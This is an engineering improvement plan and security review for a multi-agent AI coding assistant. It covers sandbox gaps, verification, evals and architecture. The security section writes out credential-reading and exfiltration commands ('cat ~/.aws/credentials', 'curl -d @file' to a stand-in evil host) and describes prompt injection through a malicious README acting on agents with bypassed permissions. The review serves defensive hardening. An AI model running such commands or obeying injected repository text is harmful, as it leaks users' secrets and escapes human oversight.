# Improvement Plan

A full-codebase review (2026-07-25, ~6,200 lines of `src/`, 973 lines of tests) surfaced
the improvements below. Each item cites the code it refers to, explains the problem, and
proposes a fix. Severity/leverage is ranked within each section; the overall sequencing
recommendation is at the end.

**TL;DR** — the architecture and learning loop are strong for a project this size, but:
(1) several stated security guarantees do not hold, (2) the verification gate can be
whitewashed by a single green test, (3) there is no CI and only two toy eval tasks, so
improvement is currently unmeasurable, and (4) the repo map / editing tools leave the
agents far less capable on real repos than they should be.
ran in parallel with command
---

## Implementation status (2026-07-25, after two remediation passes)

Full suite: 245 Python tests + 14 JS tests passing; offline replay eval green in CI.

| Area | Fixed | Notes / residual |
|---|---|---|
| Security | S1 S2 S3 S4 S6 S7 S8, S5 | S5: honest docs + optional `ADA_SANDBOX=bwrap\|container` backends (no-network by default) with graceful fallback; full mandatory containerization remains a deployment choice |
| Verification | V1 V2 V3 V4 V5 V6 | V5: SignalProvider registry (typecheck/build/coverage, baseline-delta scored); V6: Go/Rust/Java/Ruby test detection |
| Evals & CI | E1 E2 E3 E4 E5 | 3 repo-fixture golden tasks with held-out tests, `--repeat`/timeout/metrics (parallelism, routing, cost), 9 committed cassettes replayed offline in CI |
| Context | C1 C2 C3 C4 | Unified `BudgetPolicy` (per-model), line-boundary truncation, prompt-cache breakpoints on the stable prefix (anthropic backend) |
| Tooling | T1 T2 T3 T4 T5 T6 | symbols/find_references, depth-1 `delegate`, SSRF-guarded `web_fetch` (off by default), reviewer sees per-subtask changed files |
| Memory | M1 M2 M3 M4 M5 | Retrieval benchmark: hybrid RRF beats pure cosine (P@5 0.25 vs 0.22, R@5 0.96 vs 0.83) on the labeled set |
| Architecture | A1 A2 A3 A4 | A1: run() decomposed into setup/execute/finalize phase methods (full phase *objects* not adopted — deliberate, diminishing returns) |
| Reliability | R1 R2 R3 R4 R5 R6 | R1: plan + per-subtask checkpoints in SQLite, `ai-dev-assistant resume <id>` + web Resume button; R3: per-turn budget stop in the anthropic loop (SDK loop can only refuse-to-start — SDK limitation); R5: process-group registry + kill-on-cancel, queue over-subscription guards |
| Web | W2 W3 W4 W5 W6 + auth | Run comparison, cost-vs-budget meter, resume/retry, queue-start toast, diff viewer, JS helper tests via `node --test` |
| Test coverage | all previously-zero modules covered | Remaining untested surface: the bulk of app.js beyond the extracted pure helpers (browser-DOM code) |

Known caveats: replay cassettes hash exact prompts — after editing agent/reviewer prompt
templates, regenerate offline with `ai-dev-assistant eval --record-cassettes`; `delegate`'s
spawn runs on a worker-thread event loop, so a loop-bound provider surfaces a tool error
rather than delegating (degrades safely).

### Third pass (same day): every residual closed

- **SDK mid-run budget stop**: the PreToolUse gate now denies ALL tool calls once
  `max_cost_usd` is spent — an over-budget SDK agent can only wrap up with text.
- **Per-subtask git worktrees** (`ADA_WORKTREE_PER_SUBTASK`): parallel subtasks work in
  isolated checkouts under `.ada_worktrees/` and merge back serially with conflict
  detection. Building this surfaced and fixed a context-poisoning bug: sibling worktrees
  were leaking into the repo map / context packs / reviewer file lists — all workspace
  scans now exclude engine-internal dirs.
- **Golden suite → 10 tasks** across Python/JS/Go/Rust/Ruby with per-language held-out
  grading and toolchain-aware skips; secret-gated `workflow_dispatch` live-eval workflow
  uploads the JSON scorecard.
- **A/B tuning harness**: `ada eval --ab ADA_KNOB=V1,V2 [--replay]` compares pass-rate /
  quality / cost per arm with a verdict line — config choices are now tunable with data.
- **Web UI**: remaining pure logic (event reducer, budget meter, comparison/timeline
  models, resume gate) extracted into `util.js` (31 node tests total) and a full a11y
  pass (dialog semantics + focus traps, tablist roles, keyboard activation, aria-labels,
  focus-visible, reduced-motion, contrast). Also removed a claude.ai preview-harness
  script that had been embedded in `index.html` since the initial commit.
- **Deployment**: multi-stage non-root Dockerfile (fixed a `.dockerignore` bug that made
  the previous image unbuildable), hardened docker-compose (`read_only` rootfs verified
  live, `cap_drop: ALL`, `no-new-privileges`), and `docs/DEPLOYMENT.md` with the threat
  model. `RunContext` now threads the run phases (A1 closed).

Remaining by design: mandatory containerization stays a deployment choice (see
DEPLOYMENT.md); browser-DOM code in app.js is untested beyond the extracted logic
(a Playwright harness would be the first new dev dependency); live-LLM evals run via the
manual workflow, not on every push.

Highlights of what changed: SDK built-ins are now confined by a PreToolUse deny-hook
(no more `bypassPermissions`); the async exec path is sandboxed and process groups are
actually killed; `install_packages` validates PEP 508 and installs to a per-workspace
target; verification gates on a pre-run baseline delta with per-subtask scoped tests and
a capped, scoped-only soft-pass; events stream durably on emit; the scheduler dispatches
rolling (`FIRST_COMPLETED`); the repo map is symbol-ranked and injected per-subtask; the
web API has bearer-token auth, per-run repo selection, and a diff viewer; redaction covers
memory/KB/docs/events and five new secret patterns; and CI now runs the suite on push.

---

## 1. Security

The stated model — tools rooted at the run workspace, secret denylist, scrubbed-env +
rlimit sandbox, redaction, audit — is partially aspirational. These are the gaps, in
severity order.

### S1. SDK built-in tools escape the workspace entirely — **critical**

`llm/claude_sdk_provider.py:164-174` constructs `ClaudeAgentOptions` with
`permission_mode="bypassPermissions"` and allowlists the SDK built-ins
`Read/Write/Edit/Glob/Grep/LS`, setting only `cwd`. `cwd` is a working directory, **not a
sandbox boundary** — the built-ins accept absolute paths. An agent can `Read
~/.ssh/id_rsa` or `~/.aws/credentials`, or `Write` anywhere the process user can,
bypassing `ToolBox._resolve` and `_SECRET_GLOBS` (`tools/registry.py:48-58, 113-120`)
completely. The comment at `claude_sdk_provider.py:58` ("Confine the SDK's built-in
file/bash tools to a workspace dir") states an invariant the code does not enforce.

**Fix (~30 lines):** register a `can_use_tool` callback that resolves every path argument
and rejects anything outside the run workspace (and anything matching the secret
denylist); or remove the built-ins from `allowed_tools` and rely solely on the MCP tools,
which already enforce the boundary.

### S2. `install_packages` runs unsandboxed pip into the host environment — **critical**

`tools/registry.py:281-282` runs `[sys.executable, "-m", "pip", "install", *pkgs]` with
`sandbox=False`: full unscrubbed env (API keys present), network access, arbitrary code
execution via a package's build backend / `setup.py`, and it mutates the same interpreter
the assistant itself runs in. Package names come from model output via `shlex.split`, so
`--index-url`, git URLs, and local paths all pass through.

**Fix:** install into a per-run venv inside the workspace with a scrubbed env, validate
each argument as a plain PEP 508 requirement (reject flags/URLs/paths), or remove the tool.

### S3. The async `run_command` path has no sandbox at all — **high**

`execution.py:93-113` (async) passes no `env` and no `preexec_fn` — unlike the sync path
(`execution.py:53-73, 116-135`) which scrubs env and sets `RLIMIT_CPU`/`RLIMIT_AS`. The
async path is what the engine uses for post-run workspace test execution (`engine.py:256`
→ `run_workspace_tests`), so **model-authored test files execute with the full parent
environment, including `ANTHROPIC_API_KEY`** — the exact leak `scrubbed_env()` exists to
prevent.

**Fix:** apply the identical scrubbed-env + rlimits + setsid treatment to the async path.

### S4. Process-group kill is documented but not implemented — **high**

`execution.py:9` documents "a new process group that is killed as a whole on timeout,"
and `os.setsid()` is set in `preexec_fn` (`execution.py:61`) — but the sync path uses
`subprocess.run(timeout=...)` (`execution.py:127`), whose timeout kills only the direct
child and then blocks in `communicate()`. A grandchild that inherits the stdout pipe
survives **and can hang the caller indefinitely**. There is no `os.killpg` anywhere in
the file. Also missing: `RLIMIT_NPROC` (a fork bomb survives `RLIMIT_AS`) and a
wall-clock guard beyond the subprocess timeout.

**Fix:** manage the process with `Popen`, and on timeout `os.killpg(os.getpgid(pid),
SIGKILL)`; add `RLIMIT_NPROC`.

### S5. Filesystem/network are not actually contained — **high**

Even the "sandboxed" sync path only scrubs env and sets rlimits. `cat
~/.aws/credentials`, `curl -d @file https://evil.tld`, and `ln -s / esc` all succeed
inside `run_command`. Calling this "sandboxed" in the README and tool descriptions
over-promises.

**Fix:** run commands in a real container/jail (Docker, `sandbox-exec` on macOS, bwrap on
Linux) with no network by default; or at minimum rename/re-document the guarantee
honestly and gate network-using commands.

### S6. The untrusted-content envelope is dead code — **high**

`security/redaction.py:39-43` defines `untrusted()`; a repo-wide grep finds **zero call
sites**. File contents, KB hits, and memory — all attacker-influenceable in a repo-backed
run — are injected into prompts as plain text. Combined with S1's
`bypassPermissions`, prompt injection via a malicious `README.md` or docstring in a
cloned repo executes with no human in the loop.

**Fix:** wrap all repo-derived and retrieval-derived content in `untrusted()` at the
context-assembly boundary (`engine.py:564-574`, `agents/reviewer.py:33-36`, KB/memory
tool outputs), and add a system-prompt rule that enveloped content is data, not
instructions.

### S7. Redaction covers less than the docs claim — **medium**

`redact()` is applied only to `ToolBox.dispatch` output and audit args
(`tools/registry.py:103-106`, `redaction.py:57`). Agent result text flows **unredacted**
to memory (`engine.py:585`), the KB (`engine.py:407-416`), `report.md`
(`docs/writer.py:67`), and the WebSocket (`engine.py:642-650`) — contradicting the
architecture doc's "secret redaction on tool output/docs/memory."

**Fix:** redact at the memory/KB/docs/event-emit boundaries, not just the tool boundary.

### S8. Web server has no authN/authZ; Docker binds 0.0.0.0 — **high in Docker, low on localhost**

`web/server.py` has no API key, session, CORS policy, or rate limiting, while exposing
endpoints that ultimately run arbitrary commands. The CLI default host is localhost
(`cli.py:35`), which mitigates — but the **Dockerfile ships `--host 0.0.0.0` with no
auth**, exposing RCE to anything that can reach the port.

**Fix:** bearer-token auth (auto-generated, printed at startup) + explicit CORS, enforced
whenever the bind address is non-loopback.

---

## 2. Verification integrity

The instinct — ground verdicts in real file contents and real test runs, let green tests
override an LLM nitpick — is the strongest part of the system. But the implementation has
holes that let unverified work through.

### V1. The soft-pass override whitewashes acceptance criteria — **critical**

`apply_objective_gate` (`verification.py:87-95`) promotes *any* LLM-failed verdict to
`passed=True, score≥70` whenever tests pass. Combined with V2, a single trivial green
test anywhere in the workspace overrides every acceptance criterion the tests don't
cover, on every subtask.

**Fix:** the override should require that the passing tests actually exercise the
subtask's changed files (coverage or import-graph check), and should cap, not floor, the
score when the LLM reviewer failed it.

### V2. "The subtask's tests" are the whole workspace's tests — **critical**

`_has_tests` globs the entire workspace (`engine.py:656-658`) and `gather_signals` runs
the full suite (`verification.py:64`, `execution.py:143-145`). Consequences: subtask A is
hard-failed by subtask B's broken test; the full suite re-runs once per subtask **per
retry**; and parallel subtasks run pytest concurrently in a shared directory while
sibling agents are mid-write — flaky by construction.

**Fix:** scope test runs to the files the subtask touched — the engine already computes
the per-subtask file diff at `engine.py:608-616`; use it to select test files. Longer
term, give each parallel subtask its own git worktree so siblings stop clobbering each
other.

### V3. No baseline capture — **high**

Tests that were already red before the agents touched anything are attributed to the
subtask. "Did we break something" is unanswerable.

**Fix:** snapshot test + lint results at run start (post-materialize, pre-plan) and gate
on the **delta**.

### V4. Lint is decorative — **medium**

A lint failure only appends a note string; it never affects `passed` or `score`
(`verification.py:96-100`).

**Fix:** new lint errors (vs. the baseline of V3) should subtract from the score;
syntax-level errors should fail.

### V5. Missing signals — **medium**

No type checking (mypy/pyright/tsc), no build check (the devops agent can emit a
Dockerfile nobody builds), no coverage delta, no formatter check, no security scan —
despite a `security_auditor` agent existing. Adding any of these today means hand-editing
`gather_signals` and `apply_objective_gate`.

**Fix:** introduce a `SignalProvider` interface (name, run(workspace, changed_files) →
Signal) and register type-check/build/coverage providers behind it.

### V6. Python/Node only — **low**

`detect_test_command` handles pytest and `npm test` and nothing else
(`execution.py:76-90`). Go/Rust/Java/Ruby repos have no verification path.

---

## 3. Evals & CI — making improvement measurable

### E1. No CI at all — **critical, cheapest high-value fix**

`.github/` does not exist. Nothing runs `pytest` or `ada eval` on a commit; the
`--json` output and nonzero exit code in `cli.py:58-74` were built for CI that was never
added. **Fix:** a GitHub Actions workflow running `pytest -q` on every push. A few hours
of work; the only thing preventing silent regression across 6,200 lines.

### E2. Two toy golden tasks — **high**

`evals/harness.py:33-47` contains exactly `reverse_string` and `is_prime`. Nothing
repo-scale: no task binds `ADA_REPO_PATH`, so the flagship path (materialize → multi-file
edit → branch delivery) is completely ungraded. **Fix:** 10–20 tasks over small pinned
real repos.

### E3. `tests_pass` is circular — **high**

The model writes both the implementation and the tests, then is graded on its own tests
passing (`evals/graders.py:42-46`). **Fix:** held-out tests the agent never sees, applied
after the run.

### E4. Record/replay is built but unused — **medium**

`llm/record_replay.py` exists, but there are no committed cassettes and no test uses
`ReplayProvider`. **Fix:** record cassettes for a few golden tasks and commit a
replay-based regression test to CI — offline, deterministic, fast.

### E5. No variance handling; differentiators ungraded — **medium**

One sample per task means a pass/fail flip is indistinguishable from noise. None of the
system's differentiating machinery is evaluated: routing quality, parallelism achieved,
degrade-on-partial correctness, memory-recall usefulness, replan effectiveness, cost per
task. **Fix:** n≥3 runs per task; emit routing/parallelism/cost as separate scorecard
metrics; per-task timeout.

---

## 4. Context & repo understanding — the biggest quality levers

### C1. The repo map is a flat alphabetical listing — **high**

`build_repo_map` (`knowledge/repo_map.py:24-48`) is a file list plus an extension
histogram, truncated at 200 files / 6,000 chars. On any repo above ~200 files the
orchestrator sees an arbitrary alphabetical prefix (`a*`–`d*`) and nothing else. No
symbols, no ranking, no import-graph weighting — well behind aider-style ranked maps.

**Fix:** tree-sitter symbol extraction + PageRank over the import/reference graph, ranked
against the task text. The knowledge graph already has `defines`/`imports` edges
(Python-only, via `ast` — `knowledge/extract.py:39-61`) that could seed this.

### C2. Executing agents never see the repo map — **high**

The map is passed only to `orchestrator.make_plan` (`engine.py:190-192`). Per-subtask
context (`engine.py:564-574`) is: overall task, plan summary, dependency results, prior
failures, steering notes — **no repo map, no relevant-file retrieval, no KB pre-fetch**.
The coder starts every subtask blind and burns turns on `list_dir`/`grep`.

**Fix:** inject a subtask-scoped context pack — ranked repo-map slice + top-k KB hits +
files touched by dependency subtasks — into `assemble` at `engine.py:564`.

### C3. Token budgeting is crude and scattered — **medium**

`estimate_tokens` is `len(text)//4` (`context.py:12-14`); the budget is a hardcoded
`6000` at its one call site (`engine.py:574`), not derived from model window or role
effort. Magic char limits are scattered everywhere: `_MAX_FILE_CHARS = 8000` (tools),
`_MAX_FILE = 4000` / `_MAX_TOTAL = 16000` (verification), `_MAX_OUT = 6000` (execution),
`max_chars=6000` (repo_map), `result[:12000]` (`engine.py:640`). Truncation cuts mid-code
with no structure awareness.

**Fix:** one budget-policy object keyed off model + role, real tokenizer counts, and
structure-aware truncation.

### C4. No prompt caching of the stable prefix — **low**

The Anthropic client caches only the system block (`llm/client.py:44-46`). A stable
repo-map prefix would be a natural cache block once C1/C2 land.

---

## 5. Agent tooling

The 14 specialist roles (`agents/registry.py:63-199`) are well-differentiated; the tools
they hold are the weak link.

### T1. Core file tools are handicapped — **high**

- `read_file` truncates at the first 8,000 chars with **no offset/limit**
  (`tools/registry.py:174-176`) — an agent literally cannot read the second half of a
  500-line file.
- `edit_file` replaces the *first* occurrence of an exact string, once
  (`tools/registry.py:199`) — no uniqueness check (silently edits the wrong site when the
  string repeats), no multi-edit, no line anchors.
- `apply_patch` uses bare `git apply` with no `--3way` (`tools/registry.py:212`) — any
  context drift fails the whole patch.
- `grep` is substring-only, no regex, no context lines, no include-glob, implemented by
  reading every file in Python (`tools/registry.py:231-252`) — O(repo) per call.

**Fix:** offset/limit on `read_file`; uniqueness check + `replace_all` + multi-edit on
`edit_file`; `git apply --3way`; ripgrep-backed grep with regex/context/globs.

### T2. `run_tests` takes no arguments — **medium**

`tools/registry.py:459` — agents always pay for the full suite. Add `path` / `-k`
selection.

### T3. No symbol navigation — **medium**

No go-to-definition, find-references, or call hierarchy. The KG's `defines`/`imports`
edges are never queried during editing; agents rediscover structure by grep every time.
**Fix:** a symbol-index tool backed by tree-sitter (or the KG), plus `find_references`.

### T4. No sub-agent spawning — **medium**

Only the orchestrator decomposes. An agent that discovers the work is 3× bigger than
planned cannot delegate; `adaptive_replan` is the only escape valve, and it's **off by
default** (`config.py:82`) and capped at 2 repairs (`engine.py:58`).

### T5. No web access, no browser — **medium**

`allow_web` defaults False (`config.py:101`) and the Anthropic backend has no web tools
at all — yet the `integrator` agent's job is third-party libraries and external APIs, and
the `frontend` agent cannot see what it built. **Fix:** enable web search/fetch behind
the untrusted-content envelope (S6); add a screenshot tool for frontend work.

### T6. Reviewer sees whole files, never a diff — **medium**

`agents/reviewer.py:33-36` dumps whole file contents capped at 16 KB total
(`verification.py:22`) — on a real repo, mostly unchanged context. Feed it the diff.

---

## 6. Memory & learning

The loop is more complete than most projects this size: outcome-aware reflection
(`agents/reflector.py:31-48`), `remember_unique` dedup at cosine ≥0.92, recency decay
with a 14-day half-life (`memory/store.py:24, 113-146`), and agent pass-rates feeding the
planner (`engine.py:365-373`). The gaps:

### M1. No retrieval evaluation — **high**

`min_score=0.15` (`engine.py:359`), `min_score=0.1` (`tools/registry.py:126`),
`dup_threshold=0.92`, `top_k=5`, half-life 14d — all unvalidated guesses. There is no
fixture of (query → should-recall) pairs, so it's unknown whether recall helps or injects
noise. **Fix:** a small labeled retrieval set; tune thresholds against it.

### M2. Silent quality cliff on embedder fallback — **high**

If FastEmbed can't load, `get_embedder` falls back to hashed bag-of-words with only a
`warnings.warn` (`memory/embeddings.py:87-95`). Semantic recall silently degrades to
keyword overlap, and the 0.92 dedup threshold becomes near-exact-match. **Fix:** surface
the active embedder as a run event and a UI badge; fail loudly in the eval harness.

### M3. Human feedback is write-only — **high**

`set_feedback`/`get_feedback` exist (`run_store.py:149-160`) and the UI posts to them,
but **no code path reads feedback** into planning, reflection, or routing. **Fix:** feed
feedback into the reflector prompt and weight the agent track record with it.

### M4. Pure dense retrieval, no hybrid — **medium**

No BM25/keyword leg, no reranking (`memory/vector.py:58-81`). Lessons are short sentences
where lexical matching helps a lot. **Fix:** BM25 + reciprocal-rank fusion.

### M5. Unbounded growth; scoped merge is naive — **medium**

Up to 12 long-term entries per run plus one memory per subtask (`engine.py:382-392,
585`); decay affects ranking, never eviction; search is a full table scan per query.
`ScopedMemory.recall` merges project + global by raw score with no cross-store dedup
(`memory/store.py:219-224`), so a duplicated lesson eats two of five slots. **Fix:**
periodic consolidation of near-duplicate lessons; cap store size; dedup across scopes.

---

## 7. Architecture

### A1. `engine.py` is a 683-line god module — **high**

`Engine.__init__` constructs everything (two memory stores, KB, KG, bus, 14 agents,
orchestrator, reviewer, reflector, run store, tracer, audit, run control —
`engine.py:62-93`), and `run()` (`engine.py:139-348`) inlines repo materialization,
planning, scheduler wiring, verification, git delivery, reflection, indexing, doc
writing, quality scoring, and event persistence. Symptom: `verification` is imported at
module top (line 47) *and* lazily re-imported inside methods (lines 253, 662).

**Fix:** extract a `RunContext` (run id, workspace, tracer, audit, emit) and split
`run()` into `PlanPhase` / `ExecutePhase` / `FinalizePhase` objects; make the post-run
steps (reflect, index, docs, events) a declared pipeline instead of hard-sequenced
try/excepts.

### A2. Scheduler batch barrier wastes wall-time — **high**

`scheduler.run()` gathers an entire ready batch and waits for **all** of it
(`scheduler.py:82-84`) before recomputing `ready()`. A fast subtask's dependents wait on
the slowest sibling. **Fix:** `asyncio.wait(..., return_when=FIRST_COMPLETED)` with a
rolling ready-set. Highest-leverage perf change in the orchestration layer.

### A3. Layering inversion: llm → tools → everything — **medium**

`llm/provider.py:17` imports the concrete `ToolBox` from `tools/registry.py`, which
imports from `memory`, `knowledge`, and `orchestration` — the LLM abstraction transitively
depends on the whole app. **Fix:** a `ToolDispatcher` Protocol (`dispatch(name, args)`,
`definitions(names)`) owned by the llm layer.

### A4. Engine-per-request in the web layer — **medium**

`server.py:211, 239, 256` each construct a fresh `Engine`; `Engine.__init__` builds two
`MemoryStore`s (`engine.py:68-69`), each loading the FastEmbed ONNX model. That's two
model loads per plan request and two more per run. **Fix:** one shared Engine (or at
least a shared embedder singleton) with per-run state moved into `RunContext` (A1).

### A5. No verification-signal or post-run abstractions — **medium**

Covered by V5 and A1 — noted here because both fixes fall out of the same decomposition.

---

## 8. Reliability & operations

Already better than average (bounded retry with jitter + `Retry-After` in
`llm/resilience.py:57-84`; transient retries don't consume the review budget;
degrade-on-partial; DAG validation; orphan interruption on server start; persistent
queue; pause/resume/steer; tracing; healthz). The gaps:

### R1. No resume — interrupted runs lose all completed work — **high**

`SubTaskState` lives only in memory; `RunStore` persists aggregates
(`run_store.py:16-36`). The only recovery is `--continue`, which re-plans from scratch.
**Fix:** checkpoint each subtask's status/result/verdict to SQLite after every verdict;
add `--resume <run-id>` that reloads the DAG and skips completed subtasks.

### R2. `events.jsonl` written only on the success path — **high**

`engine.py:308` — a crashed or cancelled run leaves **no durable event log**, exactly the
run you'd want to debug. **Fix:** append-on-emit instead of dump-at-end.

### R3. Budget cap is coarse and can silently never trip — **medium**

Checked only before starting a subtask (`engine.py:537-543`) — one 80-turn agent can blow
arbitrarily past it mid-flight. No per-subtask token cap, no run wall-clock cap, no cap
on plan size (a hallucinated 40-subtask plan just runs). On the `claude_sdk` backend the
cost figure depends on `total_cost_usd` from `ResultMessage`
(`claude_sdk_provider.py:191-200`); if absent, the budget never trips. **Fix:** per-turn
budget check inside the agent loop; wall-clock cap; plan-size cap; treat missing cost
data as an error, not zero.

### R4. Concurrent-run data races — **medium**

With `max_concurrent_runs > 1`: each run loads the project `knowledge_graph.json` into
its own NetworkX object and saves at the end (`engine.py:304`,
`knowledge/graph.py:99-105`) — last writer silently wins. SQLite is opened without
`journal_mode=WAL` or `busy_timeout` anywhere (`memory/store.py:71`, `run_store.py:81`).
**Fix:** WAL + busy_timeout everywhere; a single process-wide KG writer or file locking.

### R5. Shallow cancellation; running set not persisted — **low**

`t.cancel()` cancels the asyncio task but spawned SDK subprocesses and `run_command`
children are not tracked or killed. `app.state.running` is memory-only, so a restart
mid-run loses the running set while the queue survives — the pump can over-subscribe.

### R6. Dead config — **trivial**

`clarify` is read into `Settings` (`config.py:83, 149`) and never used. Delete or
implement.

---

## 9. Web UI & server

Genuinely live already (per-task `Broker` with backlog replay — `web/server.py:37-61`;
WebSocket streaming; plan DAG, live agent cards, timeline, metrics, queue management,
pause/steer, feedback, workspace browser). The gaps:

### W1. Auth — see S8. **high**

### W2. Repo binding is env-only; the headline feature is unusable from the UI — **high**

`ADA_REPO_PATH`/`ADA_REPO_URL` come only from `Settings.load()`; `RunRequest`
(`web/server.py:121-131`) has no repo field, so per-run repo selection from the web UI is
impossible — you must restart the server with different env vars. **Fix:** add
`repo_path`/`repo_url` to `RunRequest` (validated against an allowlist of parent dirs).

### W3. Event loop blocked during heavy phases — **medium**

`build_repo_map`, `onboard` (embeds up to 120 files), `enrich_kg_from_workspace`, and
`_index_artifacts` run synchronously inside `async def run` (`engine.py:174-175, 273,
302`). During onboarding of a real repo, every WebSocket and every other run freezes.
**Fix:** `asyncio.to_thread` these phases.

### W4. Unbounded broker memory — **medium**

`app.state.brokers[task_id]` accumulates every event for every task, removed only in
`delete_task` (`web/server.py:396`). A long-lived server leaks monotonically. **Fix:**
evict brokers on run completion; serve history from `events.jsonl` (R2) instead.

### W5. UX gaps — **medium**

No diff viewer (the run produces a git commit nobody can view in the UI — the Files tab
shows content, not changes); no retry-a-single-subtask; no run comparison; no live
cost-vs-budget meter; no notification when a queued task starts; no artifact download.
The diff viewer is the highest-value single addition.

### W6. Minor issues — **low**

`app = create_app()` at module import (`web/server.py:676`) runs `Settings.load()` and
opens SQLite at import time — awkward for tests/reloaders. A few interpolations skip
`escapeHtml` (e.g. `app.js:1165`, agent name) — server-controlled today, low severity.

---

## 10. Test coverage

973 test lines vs 6,219 src lines (~16%), all offline via `FakeProvider`. What exists is
well-chosen (e2e pipeline incl. parallelism, budget stop, degrade-not-cascade, DAG
validation, objective gate both directions, session pool, JSON repair, context budgeting,
re-engagement, plan refinement). Zero-coverage modules, by value of adding tests:

| Module | Lines | Why it matters |
|---|---|---|
| `tools/registry.py` | 461 | **The entire security boundary** — `_resolve` path escape, secret denylist, symlink guard, `run_command`, `install_packages`. Untested. |
| `security/redaction.py` | 59 | A regex regression silently leaks secrets. |
| `orchestration/run_store.py` | 242 | Queue ordering, promote/reorder, migrations, track record. |
| `llm/client.py` + `resilience.py` + `anthropic_provider.py` + `record_replay.py` | 288 | The entire Anthropic backend and retry logic. |
| `verification.py` (partial) | 101 | `collect_file_contents`, `lint_workspace` untested. |
| `knowledge/repo_map.py`, `knowledge/base.py` | 126 | Untested. |
| `docs/writer.py` | 130 | Untested. |
| `vcs.py` | 90 | Only indirect coverage via one git-finalize test. |
| `agents/reflector.py`, `agents/reviewer.py` | 103 | Untested. |
| `projects.py`, `trace.py`, `message_bus.py`, `run_control.py` | 204 | Untested. |
| `web/static/*` | 2,483 | No JS tests at all. |

Also: `_handlers` and `_TOOL_DEFS` in `ToolBox` are two parallel lists that can silently
drift (`tools/registry.py:64-85` vs `:346-461`) — add a parity assertion.

**Priority order:** (1) `test_tools.py` — path escape (`../`, absolute, symlink), secret
denylist, `run_command` sandboxing; (2) `test_redaction.py` with real key-shape fixtures;
(3) `test_run_store.py` queue semantics; (4) resilience tests with a fake failing client
(429 → backoff → `TransientLLMError`); (5) the schema/handler parity assertion.

---

## Recommended sequencing

| Phase | Items | Rationale |
|---|---|---|
| **1. Close the worst holes** (days) | S1, S3, S4, S2 | Small fixes; everything else in the security model is bypassable while S1 stands. |
| **2. Lock in correctness** (days) | E1 (CI), E4 (replay tests), tests for `tools/` + `redaction` | Cheap; prevents regression during everything below. |
| **3. Make verification trustworthy** (~1 wk) | V2, V3, V1, R2 | Results become believable; per-subtask scoping also cuts cost and flakiness. |
| **4. Make results good** (1–2 wks) | C1, C2, T1, T2, E2/E3 | Ranked repo map + fixed editing tools are the biggest quality levers; repo-level evals measure the gain. |
| **5. Structural payoff** (1–2 wks) | A1, A2, A4, R1, W3 | Engine decomposition, event-driven scheduler, resume; makes all later work cheaper. |
| **6. Polish & depth** (ongoing) | M1–M5, W2, W5 (diff viewer), T3–T6, S5–S8, R3–R5, V4–V6 | Learning-loop tuning, UI, richer tooling, deeper sandboxing. |

The single most important principle: do phase 2 (CI + evals) **before** phase 4 — without
it, you cannot tell whether the quality levers actually moved anything.
